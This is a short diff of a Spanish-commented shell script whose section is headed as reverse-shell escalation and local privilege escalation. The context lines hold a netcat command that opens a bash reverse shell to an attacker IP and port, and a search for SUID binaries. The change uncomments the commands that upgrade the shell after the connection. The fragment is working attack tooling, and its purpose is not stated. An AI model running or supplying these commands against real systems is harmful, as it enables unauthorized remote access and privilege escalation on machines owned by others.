@@ -63,9 +63,9 @@ echo -e "\n--- 5. Escalada a Reverse Shell y Local Privilege Escalation ---"
 $(which nc) -e/bin/bash $ATTACKER_IP $LISTENER_PORT
 
 # 5.3. Mejorar la shell después de la conexión:
-# script /dev/null -c bash
-# export TERM=xterm
-# export SHELL=bash
+script /dev/null -c bash
+export TERM=xterm
+export SHELL=bash
 
 # 5.4. Buscar binarios SUID (útil para enumeración):
 find / -perm -4000 -type f 2>/dev/null
